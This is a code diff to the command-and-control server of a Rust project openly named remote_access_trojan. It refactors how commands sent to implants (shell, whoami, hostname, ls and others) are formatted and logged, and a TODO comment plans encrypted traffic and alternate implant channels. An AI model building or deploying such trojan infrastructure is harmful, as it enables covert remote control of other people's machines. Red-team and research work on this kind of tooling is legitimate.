@@ -3,6 +3,7 @@ use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions,
 use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
 use remote_access_trojan::rat::schedule_command_server::{ScheduleCommand, ScheduleCommandServer};
 use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
+use remote_access_trojan::RsRatCommand;
 use std::collections::HashMap;
 use std::convert::From;
 use std::fs::OpenOptions;
@@ -22,36 +23,6 @@ TODO
     - encrypt traffic from operator to server
     - alternate communication method(s) between implant and server
 */
-
-// Create a wrapper for RatCommand so I can implement a formatter
-#[derive(Debug)]
-struct FormattableRatCommand<'a>(&'a str);
-
-impl From<RatCommand> for &FormattableRatCommand<'_> {
-    fn from(rat_command: RatCommand) -> Self {
-        match rat_command {
-            RatCommand::Cadence => &FormattableRatCommand("cadence"),
-            RatCommand::Dir => &FormattableRatCommand("dir"),
-            RatCommand::Hostname => &FormattableRatCommand("hostname"),
-            RatCommand::Ip => &FormattableRatCommand("ip"),
-            RatCommand::Ls => &FormattableRatCommand("ls"),
-            RatCommand::None => &FormattableRatCommand("none"),
-            RatCommand::Os => &FormattableRatCommand("os"),
-            RatCommand::Quit => &FormattableRatCommand("quit"),
-            RatCommand::Shell => &FormattableRatCommand("shell"),
-            RatCommand::Whoami => &FormattableRatCommand("whoami"),
-        }
-    }
-}
-
-// Convert a RatCommand enum variant to the string that the operator typed
-fn pretty_print_command(command: RatCommand) -> String {
-    let command: &FormattableRatCommand = command.into();
-    let command = format!("{command:?}");
-    let command: Vec<&str> = command.split(&['(', ')'])
-                                    .collect();
-    command[1].trim_matches(|s| s == '"').to_lowercase()
-}
 
 #[derive(Default)]
 pub struct MyAskForInstructions {}
@@ -81,7 +52,7 @@ impl AskForInstructions for MyAskForInstructions {
             Ok(Response::new(
                 CommandRequest {
                     command: RatCommand::try_into(RatCommand::None).unwrap(),
-                    arguments:String::from("")
+                    arguments: String::from("")
                 }
             ))
         }
@@ -98,7 +69,7 @@ impl RecordCommandResult for MyRecordCommandResult {
         let request = request.into_inner();
         let implant_id = request.implant_id;
         let timestamp = request.timestamp;
-        let command = pretty_print_command(RatCommand::from_i32(request.command).unwrap());
+        let command: &str = RsRatCommand::from(request.command).into();
         let arguments = request.arguments;
         let result = request.result;
         // Determine where the result should be written based on the implant ID
